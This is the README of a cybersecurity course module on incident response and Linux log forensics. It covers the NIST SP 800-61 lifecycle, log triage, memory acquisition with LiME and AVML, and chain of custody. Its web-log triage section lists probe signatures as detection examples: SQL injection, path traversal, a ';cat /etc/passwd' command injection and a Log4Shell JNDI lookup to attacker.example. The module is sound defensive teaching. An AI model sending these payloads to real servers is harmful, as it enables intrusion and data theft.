# Week 9 — Incident Response and Log Forensics

> *Week 7 taught you how to find weaknesses on a host you own. Week 8 taught you how to exploit and then patch them on an application you wrote. Week 9 assumes the worst-case outcome of the prior two weeks happened anyway: an alert fired, a host on your network is misbehaving, and someone has to figure out, in the next thirty minutes, whether the company is in the middle of an active intrusion. By Sunday night you will have walked the full NIST SP 800-61 Rev. 2 incident-response lifecycle, reconstructed the timeline of a (simulated) compromise from Linux logs alone, taken a forensic-grade memory image with chain-of-custody discipline, and written the post-incident report that a real organisation would expect.*

Welcome to Week 9 of **C6 · Cybersecurity Crunch**. The first eight weeks built the discipline of *preventing* incidents: hardening the host, modelling the threat, reviewing the code, exploiting and patching the bug. Week 9 reverses the polarity. The incident has happened. The question is no longer "can it be exploited" but "what happened, how do we stop it, and what do we tell the people whose data was on the host." This week's currency is logs, timestamps, hashes, and chain of custody. The lab is a simulated compromised Linux VM whose `/var/log/`, journal, and shell-history artefacts have been bundled into a starter directory; your job is to reconstruct the timeline from those artefacts and write the report.

```
+---------------------------------------------------------------------+
|  AUTHORIZED INVESTIGATION ONLY                                      |
|                                                                     |
|  Every command, script, and procedure in this module is run         |
|  against:                                                           |
|  - the simulated compromised host artefacts bundled with this       |
|    week's mini-project starter directory, on your own laptop, OR    |
|  - a system you personally own and administer, OR                   |
|  - a system on which you hold a current, written, signed            |
|    investigation authorisation from the system's owner (incident    |
|    response engagement letter, employer's IR-team standing          |
|    authorisation, a court order, or equivalent).                    |
|                                                                     |
|  Forensic acquisition of a system you do not own and are not        |
|  authorised to investigate is, in the United States, simultaneously |
|  a violation of the Computer Fraud and Abuse Act (18 U.S.C.         |
|  § 1030), the Stored Communications Act (18 U.S.C. § 2701), and     |
|  in many states a separate tort. In the United Kingdom it violates  |
|  the Computer Misuse Act 1990. In the European Union it violates    |
|  Directive 2013/40/EU as implemented in each member state. Memory   |
|  acquisition is the most invasive of all reads; it captures keys,   |
|  credentials, decrypted documents, and the contents of every        |
|  running process. The penalties are real and case law is settled.   |
|                                                                     |
|  If you cannot point at a document or an ownership claim that       |
|  authorises the investigation, you do not run the investigation.    |
|  The same rule that governed Week 7's scans and Week 8's payloads   |
|  governs Week 9's acquisitions — only the technical posture is      |
|  different.                                                         |
+---------------------------------------------------------------------+
```

Read the banner once carefully now; thereafter treat it as a contract. Every exercise, every challenge, and every step of the mini-project is written so the only target is the simulated artefacts in *this directory* or a host you personally own. If a write-up ever instructs you to acquire memory or pull logs from a host outside that scope, stop and re-read the banner.

---

## Learning objectives

By the end of this week, you will be able to:

- **Recite and apply** the **NIST SP 800-61 Rev. 2** incident-response lifecycle: *preparation*, *detection and analysis*, *containment, eradication, and recovery*, and *post-incident activity*. Place every action you take during an incident inside one of those four phases, and explain why ordering matters (you do not eradicate before you contain; you do not recover before you eradicate; you do not skip post-incident review even when the customer says the incident is over).
- **Execute** the **first-thirty-minutes checklist** when an alert fires: confirm the alert (is it real, is it the host the alert claims it is), classify the severity using the categories defined in NIST SP 800-61 § 2.4, decide on initial containment (network isolate, leave running, or pull the plug), notify the on-call rotation and the legal/compliance contacts that the runbook lists, and start an incident log with the first timestamp.
- **Triage** a Linux host's logs as a first responder. Read **`journalctl`** with the flags that matter under pressure (`-u`, `--since`, `--until`, `-o short-iso`, `--no-pager`), pull authentication history from **`/var/log/auth.log`** (or `/var/log/secure` on RHEL-family systems), read **`last`** and **`lastb`** for login and failed-login history, run **`who`** and **`w`** for active sessions, and reconstruct a filesystem timeline with **`find -newer`**, **`stat`**, and the **mtime / ctime / atime** triplet.
- **Triage** a web server's access logs at the speed of a junior SOC analyst. Recognise the canonical signatures of automated scanners (high-rate `404` runs, predictable `User-Agent` strings such as `Nikto`, `sqlmap`, `nmap http-enum`, `dirbuster`), the canonical patterns of SQL injection probes in URL parameters, the canonical patterns of path-traversal and command-injection probes, and the canonical signatures of credential-stuffing against a login endpoint. Write a script that ingests an `nginx` access log and surfaces the top suspicious patterns ranked by frequency.
- **Acknowledge** the **Windows event-log baseline** for incident response (this is a Linux course, so the depth is conceptual): **Sysmon** events **1** (process creation), **3** (network connection), **7** (image loaded), and **11** (file creation) are the four event IDs that drive most modern Windows EDR detections; the **Microsoft `Sysmon`** documentation is the canonical reference; the **SwiftOnSecurity Sysmon configuration** is the most-cited free starter config. The detail is left to a future Windows-focussed course; the awareness is required.
- **Acquire** a forensic-grade **memory image** from a running Linux host using either **LiME** (Linux Memory Extractor, the kernel-module path) or **AVML** (Microsoft's userspace memory acquisition tool, the simpler path). Document the acquisition in a chain-of-custody form: time of acquisition, the SHA-256 of the resulting image, the operator's identity, the system identifier, the tool version, the authorisation reference. Reason about *order of volatility* (RFC 3227) and why memory is acquired before disk.
- **Maintain chain of custody** on the artefacts you collect. Every artefact gets a SHA-256 (and, for older-tooling compatibility, an MD5) computed at acquisition time, recorded in a custody log, and re-verified at every transfer between systems or analysts. The custody log lives in version control next to the report and is signed (PGP-signed or, at minimum, committed by a known identity) by every analyst who handles the artefact.
- **Map** the actions of the simulated intruder to the **MITRE ATT&CK** framework: Initial Access (T1078 Valid Accounts / T1190 Exploit Public-Facing Application), Execution (T1059 Command and Scripting Interpreter), Persistence (T1098 Account Manipulation / T1543 Create or Modify System Process / T1136 Create Account), Privilege Escalation (T1548 Abuse Elevation Control Mechanism / T1068 Exploitation for Privilege Escalation), Defence Evasion (T1070 Indicator Removal — log clearing), Discovery (T1057 Process Discovery), Credential Access (T1003 OS Credential Dumping), Lateral Movement (T1021 Remote Services), Collection (T1005 Data from Local System), Exfiltration (T1041 Exfiltration Over C2 Channel). The mini-project requires you to label every observed event with at least one ATT&CK technique ID.
- **Ship** a **post-incident report** that any incident-response engagement would recognise: executive summary in non-technical language, timeline of observed events with timestamps in **ISO 8601 UTC**, indicators of compromise (IOCs) suitable for sharing with peer organisations and CISA, MITRE ATT&CK mapping, root-cause analysis, containment and eradication actions, recovery validation, and a *lessons-learned* section that translates the post-incident-activity phase of NIST SP 800-61 into concrete improvements to the *preparation* phase next time.

---

## Prerequisites

- **Weeks 1 through 8 completed.** Week 1 introduced the Linux baseline and the security mindset; Week 3 introduced threat modelling, which is the inverse of the post-incident root-cause analysis you will do here; Week 7 covered authorised reconnaissance, whose detective counterpart you will study this week. Week 8 produced the *kind* of compromised application whose post-incident logs you will now read.
- **A Linux or macOS host where you have administrative access.** The simulated artefacts ship as text files and a tarball of `/var/log/` style content; no virtualisation is strictly required. If you want to run the optional live-host portion of the mini-project, a small Ubuntu 24.04 LTS VM (VirtualBox, VMware, UTM, or a cloud throwaway) makes it more realistic. The mandatory portion runs on the bundled artefacts alone.
- **Python 3.11 or later.** Verify with `python3 --version`. The exercises and mini-project deliverables are Python 3.11+ scripts. Type hints throughout.
- **The standard log-reading toolkit on the path.** `journalctl` (systemd; present on every modern Linux distro), `grep`, `awk`, `sed`, `sort`, `uniq`, `tail`, `head`, `find`, `stat`, `who`, `w`, `last`, `lastb`. macOS users can install `coreutils` from Homebrew to get GNU `find` and `stat`; the BSD equivalents work for most exercises but the flag spellings differ.
- **`sha256sum` and `md5sum`** on the path (Homebrew `coreutils` provides them on macOS where the BSD names are `shasum -a 256` and `md5`).
- **A text editor or IDE** with Python type-hint awareness (VS Code with Pylance, PyCharm Community, Vim with a Python LSP).
- **Acquaintance with `tmux` or `screen`.** Long-running acquisitions outlive an SSH session. Knowing how to detach from a session and reattach to it is not optional in incident response.
- **A chain-of-custody mindset.** Before you touch a single command this week, internalise the principle: *if you cannot reproduce the integrity check on the artefact, the artefact is not evidence*. The mini-project will fail review if any artefact is presented without a SHA-256 recorded at acquisition time.

---

## Topics covered

- **The NIST SP 800-61 Rev. 2 lifecycle.** The four phases (*preparation*; *detection and analysis*; *containment, eradication, and recovery*; *post-incident activity*) and the canonical sub-steps within each. The text of NIST SP 800-61 Rev. 2 is free and primary; the cited URL is in `resources.md`. We use NIST's language consistently this week because it is the language every regulated industry's IR runbook is written in.
- **The first-thirty-minutes checklist.** Confirm the alert, classify the severity, decide on initial containment, notify the on-call and legal contacts, start an incident log. The checklist is short by design — under pressure, long checklists fail. The lecture covers each item; the homework rewrites the checklist as a one-page runbook you can paste into your team's wiki.
- **Order of volatility (RFC 3227, *Guidelines for Evidence Collection and Archiving*).** Acquire registers and CPU caches first (in practice, you cannot), then memory, then process tables, then disk, then archival media. The principle drives every decision in the acquisition phase: live memory before powered-down disk, every time.
- **Linux log forensics.** `journalctl` for the systemd unified journal (modern distros), `/var/log/auth.log` (Debian/Ubuntu) or `/var/log/secure` (RHEL/Fedora) for authentication events, `/var/log/syslog` (Debian/Ubuntu) or `/var/log/messages` (RHEL/Fedora) for general system events, `/var/log/wtmp` and `/var/log/btmp` parsed by `last` and `lastb`, `/var/log/utmp` parsed by `who`, the per-user shell-history files (`~/.bash_history`, `~/.zsh_history`, with their well-known limitations: appended on shell exit, easy to clear, no timestamp by default).
- **Filesystem timeline reconstruction.** `find / -newer /tmp/timestamp -type f -mtime -7` to find every file modified since a reference point; `stat` to read the **mtime** (modification of file contents), **ctime** (change of inode metadata), and **atime** (last access — often unreliable because most modern Linux filesystems mount with `relatime` or `noatime`); the canonical caveats around timestamp manipulation (`touch -d` rewrites mtime and ctime in a way that does *not* trip the auditing subsystem unless you have explicitly enabled `auditd` rules for it).
- **Web-server log triage.** The default `nginx` `combined` log format. Recognising scanner User-Agents (`Nikto`, `sqlmap`, `nmap`, `dirbuster`, `gobuster`, `WPScan`, the empty / single-character User-Agents that some custom tools emit). Recognising probe URL signatures: `?id=1' OR 1=1--`, `../../../../etc/passwd`, `;cat /etc/passwd`, `${jndi:ldap://attacker.example/x}` (Log4Shell — December 2021), `/wp-login.php` brute-force volumes, `/.env` and `/.git/HEAD` discovery probes. A 100-line Python script that surfaces the top of each of those families from a log.
- **Windows event-log basics — conceptual only.** Sysmon events 1 (process creation), 3 (network connection), 7 (image loaded), 11 (file creation). Why most modern Windows EDR rules are written against Sysmon event IDs rather than the built-in Windows Security log. The Microsoft Sysmon documentation and the SwiftOnSecurity sample configuration. The depth is owed to a future course; the awareness is owed to this one.
- **Memory acquisition with LiME and AVML.** **LiME** (Linux Memory Extractor) is the kernel-module-based acquisition tool; it has been the de-facto standard since 2011 and is still maintained. **AVML** (Acquire Volatile Memory for Linux) is Microsoft's userspace alternative that does not require building a kernel module against the target kernel; in 2026 AVML is the easier path for most engagements where the responder does not have build infrastructure that matches the victim host's kernel. Both produce raw memory dumps that **Volatility 3** can analyse.
- **Chain of custody for digital evidence.** The custody log is the single document that turns an artefact into evidence. Required fields: artefact name, acquisition timestamp (ISO 8601 UTC), acquiring operator, system identifier (hostname plus an unforgeable identifier like the machine-id or a serial number), tool name and version, SHA-256 (and MD5 for legacy compatibility), authorisation reference (engagement letter ID, ticket ID, statutory authority), and a transfer log that appends a row every time the artefact moves between systems or analysts. We provide a template in the mini-project.
- **The post-incident report.** Executive summary, timeline, indicators of compromise, MITRE ATT&CK mapping, root-cause analysis, containment/eradication/recovery narrative, lessons learned. The mini-project deliverable is the report; we provide the template.

---

## Weekly schedule

The schedule below adds up to approximately **35 hours**. Treat it as a target.

| Day       | Focus                                                          | Lectures | Exercises | Challenges | Quiz/Read | Homework | Mini-Project | Self-Study | Daily Total |
|-----------|----------------------------------------------------------------|---------:|----------:|-----------:|----------:|---------:|-------------:|-----------:|------------:|
| Monday    | L1 — The NIST 800-61 lifecycle and the first 30 minutes        |    2h    |    1h     |     0h     |    0.5h   |   1h     |     0h       |    1h      |    5.5h     |
| Tuesday   | L2 — Linux log forensics and timeline reconstruction           |    2h    |    1.5h   |     0h     |    0.5h   |   1h     |     0h       |    0.5h    |    5.5h     |
| Wednesday | L3 — Memory acquisition, chain of custody, ATT&CK mapping      |    2h    |    1.5h   |     0h     |    0.5h   |   1h     |     0.5h     |    0.5h    |    6h       |
| Thursday  | Exercises polished; challenge launch                           |    0h    |    2h     |     1.5h   |    0.5h   |   1h     |     1h       |    0.5h    |    6.5h     |
| Friday    | Mini-project: triage the lab artefacts, build the timeline     |    0h    |    1h     |     0.5h   |    0.5h   |   1h     |     2h       |    0.5h    |    5.5h     |
| Saturday  | Mini-project: ATT&CK map, write the report, ship the IOCs      |    0h    |    0h     |     0h     |    0h     |   1h     |     3h       |    0h      |    4h       |
| Sunday    | Quiz, review, polish, push                                     |    0h    |    0h     |     0h     |    0.5h   |   0h     |     0h       |    1h      |    1.5h     |
| **Total** |                                                                | **6h**   | **7h**    | **2h**     | **3h**    | **6h**   |   **6.5h**   |   **4h**   |  **34.5h**  |

---

## How to navigate this week

| File | What's inside |
|------|---------------|
| [README.md](./README.md) | This overview (you are here) |
| [resources.md](./resources.md) | Free primary sources — NIST SP 800-61 Rev. 2, MITRE ATT&CK, Sysmon docs, LiME, AVML, Volatility 3, SANS free papers, journalctl and auditd manuals |
| [lecture-notes/01-ir-lifecycle-and-first-30-minutes.md](./lecture-notes/01-ir-lifecycle-and-first-30-minutes.md) | The NIST SP 800-61 Rev. 2 phases, the first-30-minutes checklist, severity classification, the on-call notification flow |
| [lecture-notes/02-linux-log-forensics.md](./lecture-notes/02-linux-log-forensics.md) | journalctl, /var/log/auth.log, last/lastb, who, find -newer, timeline reconstruction, nginx access-log triage, Sysmon awareness |
| [lecture-notes/03-memory-acquisition-and-chain-of-custody.md](./lecture-notes/03-memory-acquisition-and-chain-of-custody.md) | Order of volatility (RFC 3227), LiME and AVML acquisition workflows, chain-of-custody log, ATT&CK mapping, the post-incident report |
| [exercises/exercise-01-first-30-minutes.md](./exercises/exercise-01-first-30-minutes.md) | Walk the checklist against a synthetic alert — confirm, classify, contain, notify, log the first timestamp |
| [exercises/exercise-02-log-triage.py](./exercises/exercise-02-log-triage.py) | Python script that ingests journalctl / auth.log / nginx access-log text and surfaces the top suspicious patterns |
| [exercises/exercise-03-timeline-builder.py](./exercises/exercise-03-timeline-builder.py) | Build a single chronologically-sorted timeline from heterogeneous log sources, output as Markdown |
| [exercises/exercise-04-custody-log.py](./exercises/exercise-04-custody-log.py) | Generate and verify the SHA-256 chain-of-custody log for a directory of artefacts |
| [exercises/SOLUTIONS.md](./exercises/SOLUTIONS.md) | Worked solutions, command reference, expected outputs |
| [challenges/challenge-01-attck-mapping.md](./challenges/challenge-01-attck-mapping.md) | Map a full simulated intrusion to MITRE ATT&CK techniques with evidence pointers |
| [challenges/challenge-02-acquisition-runbook.md](./challenges/challenge-02-acquisition-runbook.md) | Write a memory-acquisition runbook for your own laptop using LiME or AVML, with chain-of-custody enforcement |
| [quiz.md](./quiz.md) | 10 questions on the NIST lifecycle, log forensics, acquisition, chain of custody, and ATT&CK |
| [homework.md](./homework.md) | Six problems, ~6 hours total |
| [mini-project/README.md](./mini-project/README.md) | Reconstruct the timeline of the simulated compromise; produce the post-incident report, IOC list, and ATT&CK map |
| [mini-project/starter/](./mini-project/starter/) | The starter directory — synthetic log artefacts, custody-log template, report template |

---

## Stretch goals

If you finish early, push further:

- Read **NIST SP 800-86 — *Guide to Integrating Forensic Techniques into Incident Response*** in full (<https://csrc.nist.gov/publications/detail/sp/800-86/final>). 800-86 is the deep companion to 800-61 and covers the technical acquisition side that 800-61 only references. Budget: 4 hours.
- Walk one full **SANS DFIR poster** — the *Hunt Evil* poster or the *Linux Shell Survival* poster — and turn the items relevant to incident response into a one-page personal reference. SANS posters are free at <https://www.sans.org/posters/>. Budget: 2 hours.
- Take the bundled lab memory snippet (or generate one from a throwaway VM you own) and run a full **Volatility 3** triage: `pslist`, `pstree`, `netstat`, `cmdline`, `bash`. Volatility 3 docs at <https://volatility3.readthedocs.io/>. Budget: 3 hours.
- Configure **`auditd`** on a throwaway Linux VM you own with a rule set sufficient to catch the simulated intruder's actions in real time. Compare what `auditd` catches against what `journalctl` alone catches. Budget: 2 hours.
- Stand up the **Wazuh** open-source SIEM (or **Security Onion**) on a throwaway VM you own, ingest the bundled log artefacts, and see how an SIEM's correlation view compares to your hand-built timeline. Both are free. Wazuh: <https://wazuh.com/>. Security Onion: <https://securityonionsolutions.com/>. Budget: 3 hours.
- Read the **CISA Incident Response Playbook** for federal civilian agencies (<https://www.cisa.gov/sites/default/files/publications/Federal_Government_Cybersecurity_Incident_and_Vulnerability_Response_Playbooks_508C.pdf>). Compare the structure to NIST SP 800-61 and note where CISA's playbook concretises the abstract NIST phases. Budget: 2 hours.
- Pick one historical compromise with public after-action reports (the **2013 Target breach**, **2017 Equifax breach**, **2020 SolarWinds**, or **2021 Colonial Pipeline**) and write a 500-word note on which NIST phase failed and what the post-incident-activity outputs should have been. Use public investigative reports, not press releases. Budget: 3 hours.

---

## Up next

Continue to [Week 10 — Cryptography in Practice](../week-10/) once your mini-project is pushed and your portfolio README links to all nine weeks. Week 10 returns to the offensive/defensive axis with a deep dive into the cryptographic primitives whose failures showed up in Week 8's A02 and whose forensic traces (TLS handshake patterns, weak-cipher fingerprints) sometimes show up in the logs you triaged this week.

---

*Found an error? Open an issue or send a PR. The next learner will thank you.*
